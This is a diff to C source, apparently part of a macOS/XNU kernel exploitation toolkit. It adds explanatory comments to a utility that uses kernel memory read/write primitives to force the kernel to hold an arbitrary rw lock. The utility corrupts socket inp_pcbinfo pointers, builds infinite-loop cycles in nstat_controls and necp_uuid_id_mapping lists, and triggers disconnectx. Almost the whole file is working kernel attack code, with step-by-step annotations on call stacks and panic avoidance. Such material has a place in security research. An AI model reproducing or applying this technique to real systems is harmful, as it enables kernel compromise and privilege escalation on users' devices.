@@ -28,7 +28,7 @@
 
 struct xe_util_lck_rw {
     int sock_fd;
-    uintptr_t lck;
+    uintptr_t target_lck_rw;
     uintptr_t socket;
     uintptr_t so_pcb;
     uintptr_t inp_pcbinfo;
@@ -40,21 +40,25 @@ struct xe_util_lck_rw {
     dispatch_semaphore_t sem_disconnect_done;
 };
 
-
+// sets value of `socket->so_pcb->inp_pcbinfo` such that address of
+// `socket->so_pcb->inp_pcbinfo.ipi_lock = target_lck_rw`
 void xe_util_lck_rw_set_lock(xe_util_lck_rw_t util) {
     xe_assert(util->inp_pcbinfo != 0);
     xe_assert(util->so_pcb != 0);
-    uintptr_t new_inp_pcbinfo = util->lck - TYPE_INPCBINFO_MEM_IPI_LOCK_OFFSET;
+    uintptr_t new_inp_pcbinfo = util->target_lck_rw - TYPE_INPCBINFO_MEM_IPI_LOCK_OFFSET;
     xe_assert(xe_kmem_read_uint64(util->so_pcb, TYPE_INPCB_MEM_INP_PCBINFO_OFFSET) == util->inp_pcbinfo);
     xe_kmem_write_uint64(util->so_pcb, TYPE_INPCB_MEM_INP_PCBINFO_OFFSET, new_inp_pcbinfo);
 }
 
+// restores socket->so_pcb->inp_pcbinfo
 void xe_util_lck_rw_restore_lock(xe_util_lck_rw_t util) {
     xe_assert(util->inp_pcbinfo != 0);
     xe_assert(util->so_pcb != 0);
     xe_kmem_write_uint64(util->so_pcb, TYPE_INPCB_MEM_INP_PCBINFO_OFFSET, util->inp_pcbinfo);
 }
 
+// make the loop `for (state = nstat_controls; state; state = state->ncs_next) { ... }`
+// in `nstat_pcb_cache` method infinite
 void xe_util_lck_create_nstat_controls_cycle(xe_util_lck_rw_t util) {
     xe_assert(util->nstat_controls_head != 0);
     xe_assert(util->nstat_controls_tail != 0);
@@ -62,6 +66,7 @@ void xe_util_lck_create_nstat_controls_cycle(xe_util_lck_rw_t util) {
     xe_kmem_write_uint64(util->nstat_controls_tail, TYPE_NSTAT_CONTROL_STATE_MEM_NCS_NEXT_OFFSET, util->nstat_controls_head);
 }
 
+// break infinite loop in nstat_pcb_cache
 void xe_util_lck_break_nstat_controls_cycle(xe_util_lck_rw_t util) {
     xe_assert(util->nstat_controls_head != 0);
     xe_assert(util->nstat_controls_tail != 0);
@@ -69,6 +74,7 @@ void xe_util_lck_break_nstat_controls_cycle(xe_util_lck_rw_t util) {
     xe_kmem_write_uint64(util->nstat_controls_tail, TYPE_NSTAT_CONTROL_STATE_MEM_NCS_NEXT_OFFSET, 0);
 }
 
+// save head and tail of nstat_controls tailq
 void xe_util_lck_read_nstat_controls_state(xe_util_lck_rw_t util) {
     xe_assert(util->nstat_controls_head == 0);
     xe_assert(util->nstat_controls_tail == 0);
@@ -87,7 +93,8 @@ void xe_util_lck_read_nstat_controls_state(xe_util_lck_rw_t util) {
     util->nstat_controls_tail = tail;
 }
 
-// infinite loop at necp_uuid_lookup_uuid_with_service_id_locked
+// make the `LIST_FOREACH()...` loop in `necp_uuid_lookup_uuid_with_service_id_locked`
+// method infinite
 void xe_util_lck_create_necp_mapping_cycle(xe_util_lck_rw_t util) {
     xe_assert(util->necp_uuid_id_mapping_head != 0);
     xe_assert(util->necp_uuid_id_mapping_tail != 0);
@@ -95,6 +102,7 @@ void xe_util_lck_create_necp_mapping_cycle(xe_util_lck_rw_t util) {
     xe_kmem_write_uint64(util->necp_uuid_id_mapping_tail, TYPE_NECP_UUID_ID_MAPPING_MEM_CHAIN_OFFSET, util->necp_uuid_id_mapping_head);
 }
 
+// break infinite loop in necp_uuid_lookup_uuid_with_service_id_locked
 void xe_util_lck_break_necp_mapping_cycle(xe_util_lck_rw_t util) {
     xe_assert(util->necp_uuid_id_mapping_head != 0);
     xe_assert(util->necp_uuid_id_mapping_tail != 0);
@@ -102,6 +110,7 @@ void xe_util_lck_break_necp_mapping_cycle(xe_util_lck_rw_t util) {
     xe_kmem_write_uint64(util->necp_uuid_id_mapping_tail, TYPE_NECP_UUID_ID_MAPPING_MEM_CHAIN_OFFSET, 0);
 }
 
+// ensures LIST_FOREACH in necp_uuid_lookup_uuid_with_service_id_locked never breaks
 void xe_util_lck_invalidate_necp_ids(xe_util_lck_rw_t util) {
     xe_assert(util->necp_uuid_id_mapping_head != 0);
     xe_assert(util->necp_uuid_id_mapping_tail != 0);
@@ -115,6 +124,7 @@ void xe_util_lck_invalidate_necp_ids(xe_util_lck_rw_t util) {
     } while (cursor != util->necp_uuid_id_mapping_tail);
 }
 
+// restores id of necp_uuid_id_mapping
 void xe_util_lck_restore_necp_ids(xe_util_lck_rw_t util) {
     xe_assert(util->necp_uuid_id_mapping_head != 0);
     xe_assert(util->necp_uuid_id_mapping_tail != 0);
@@ -128,6 +138,7 @@ void xe_util_lck_restore_necp_ids(xe_util_lck_rw_t util) {
     } while (cursor != util->necp_uuid_id_mapping_tail);
 }
 
+// save head and tail of necp_uuid_id_mapping list
 void xe_util_lck_read_necp_uuid_id_mapping_state(xe_util_lck_rw_t util) {
     xe_assert(util->necp_uuid_id_mapping_head == 0);
     xe_assert(util->necp_uuid_id_mapping_tail == 0);
@@ -178,18 +189,26 @@ xe_util_lck_rw_t xe_util_lck_rw_lock_exclusive(uintptr_t proc, uintptr_t lock) {
     util->socket = socket;
     util->so_pcb = inpcb;
     util->inp_pcbinfo = inp_pcbinfo;
-    util->lck = lock;
+    util->target_lck_rw = lock;
     util->sem_disconnect_done = dispatch_semaphore_create(0);
     
     xe_util_lck_read_nstat_controls_state(util);
     xe_util_lck_read_necp_uuid_id_mapping_state(util);
     
+    /// Sets value of `socket->so_pcb->inp_pcbinfo` such that `socket->so_pcb->inp_pcbinfo.ipi_lock = util->target_lck_rw`
+    /// This lock is acquired by method `in6_pcbdisconnect` defined in in6_pcb.c when `util->socket` is disconnected
     xe_util_lck_rw_set_lock(util);
+    /// Creates a infinite loop in nstat_pcb_cache function. This method is triggered by method `in6_pcbdisconnect`
+    /// defined in in6_pcb.c when `util->socket` is disconnected
     xe_util_lck_create_nstat_controls_cycle(util);
     
     dispatch_semaphore_t sem_disconnect_start = dispatch_semaphore_create(0);
+    /// Asynchronously disconnect `util->socket`
     dispatch_async(xe_dispatch_queue(), ^() {
         dispatch_semaphore_signal(sem_disconnect_start);
+        /// Triggers `in6_pcbdisconnect` method which acquires `util->target_lck_rw`. Since the method
+        /// `xe_util_lck_create_nstat_controls_cycle` has created a cycle in `nstat_pcb_cache`, the lock is kept held
+        /// until the cycle is broken.
         int error = disconnectx(util->sock_fd, SAE_ASSOCID_ANY, SAE_CONNID_ANY);
         xe_assert_err(error);
         dispatch_semaphore_signal(util->sem_disconnect_done);
@@ -197,6 +216,7 @@ xe_util_lck_rw_t xe_util_lck_rw_lock_exclusive(uintptr_t proc, uintptr_t lock) {
     
     dispatch_semaphore_wait(sem_disconnect_start, DISPATCH_TIME_FOREVER);
     dispatch_release(sem_disconnect_start);
+    /// Wait for some time so that the lock will be acquired
     sleep(1);
     
     return util;
@@ -204,21 +224,73 @@ xe_util_lck_rw_t xe_util_lck_rw_lock_exclusive(uintptr_t proc, uintptr_t lock) {
 
 
 void xe_util_lck_rw_lock_done(xe_util_lck_rw_t* util) {
+    /// Restores the value of `socket->so_pcb->inp_pcbinfo` so that operations in `in_pcbrehash` requiring
+    /// `inp_pcbinfo` will not cause panic
+    /// void
+    /// in_pcbrehash(struct inpcb *inp)
+    /// {
+    ///     ...
+    ///     inp->inp_hash_element = INP_PCBHASH(hashkey_faddr, inp->inp_lport,
+    ///         inp->inp_fport, inp->inp_pcbinfo->ipi_hashmask);
+    ///     head = &inp->inp_pcbinfo->ipi_hashbase[inp->inp_hash_element];
+    ///     ...
+    /// }
     xe_util_lck_rw_restore_lock(*util);
     
-    // assign different laddr (other than loopback)
+    /// Assigns different laddr (other than loopback) to `socket->so_pcb->inp_dependladdr`. This prevents
+    /// `necp_socket_bypass` method from returning `NECP_BYPASS_TYPE_LOOPBACK` allowing
+    /// `necp_socket_find_policy_match` to reach the below for loop
+    /// `for (netagent_cursor = 0; netagent_cursor < NECP_MAX_NETAGENTS; netagent_cursor++) {
+    ///     ...
+    ///     mapping = necp_uuid_lookup_uuid_with_service_id_locked(netagent_id)
+    ///     ...
+    ///  }
     struct in6_addr new_laddr;
     memset(&new_laddr, 0xab, sizeof(new_laddr));
     xe_kmem_write((*util)->so_pcb, TYPE_INPCB_MEM_INP_DEPENDLADDR_OFFSET, &new_laddr, sizeof(new_laddr));
     
+    /// Prevent the `LIST_FOREACH` in `necp_uuid_lookup_uuid_with_service_id_locked` method from breaking
+    /// static struct necp_uuid_id_mapping *
+    /// necp_uuid_lookup_uuid_with_service_id_locked(u_int32_t local_id)
+    /// {
+    ///     ...
+    ///     LIST_FOREACH(searchentry, &necp_uuid_service_id_list, chain) {
+    ///         if (searchentry->id == local_id) {      <<<--- Prevents this if condition to become TRUE --->>>
+    ///             foundentry = searchentry;
+    ///             break;
+    ///         }
+    ///     }
+    ///     ...
+    /// }
     xe_util_lck_invalidate_necp_ids(*util);
+    
+    /// Create a infinite loop in `necp_uuid_lookup_uuid_with_service_id_locked` method. This method is
+    /// indirectly triggered during socket disconnect by method `in6_pcbdisconnect`. The call stack is
+    ///     necp_uuid_lookup_uuid_with_service_id_locked
+    ///     necp_socket_find_policy_match
+    ///     inp_update_necp_policy
+    ///     in_pcbrehash
+    ///     in6_pcbdisconnect
     xe_util_lck_create_necp_mapping_cycle(*util);
+    
+    /// Breaks the infinite loop in `nstat_pcb_cache`
     xe_util_lck_break_nstat_controls_cycle(*util);
+    
+    /// Wait so that program reaches and stays at infinite loop in `necp_uuid_lookup_uuid_with_service_id_locked`
     sleep(1);
+    
+    /// Set the address of `socket->so_pcb->inp_pcbinfo.ipi_lock` back to util->target_lck_rw so that correct lock
+    /// will be unlocked when the program reaches `lck_rw_done` in `in6_pcbdisconnect`
     xe_util_lck_rw_set_lock(*util);
+    
+    /// Restore id and break the loop in infinite loop in `necp_uuid_lookup_uuid_with_service_id_locked `
     xe_util_lck_restore_necp_ids(*util);
     xe_util_lck_break_necp_mapping_cycle(*util);
+    
+    /// Wait until socket `disconnectx` returns success
     dispatch_semaphore_wait((*util)->sem_disconnect_done, DISPATCH_TIME_FOREVER);
+    
+    /// Restores value of `socket->so_pcb->inp_pcbinfo`
     xe_util_lck_rw_restore_lock(*util);
     
     dispatch_release((*util)->sem_disconnect_done);
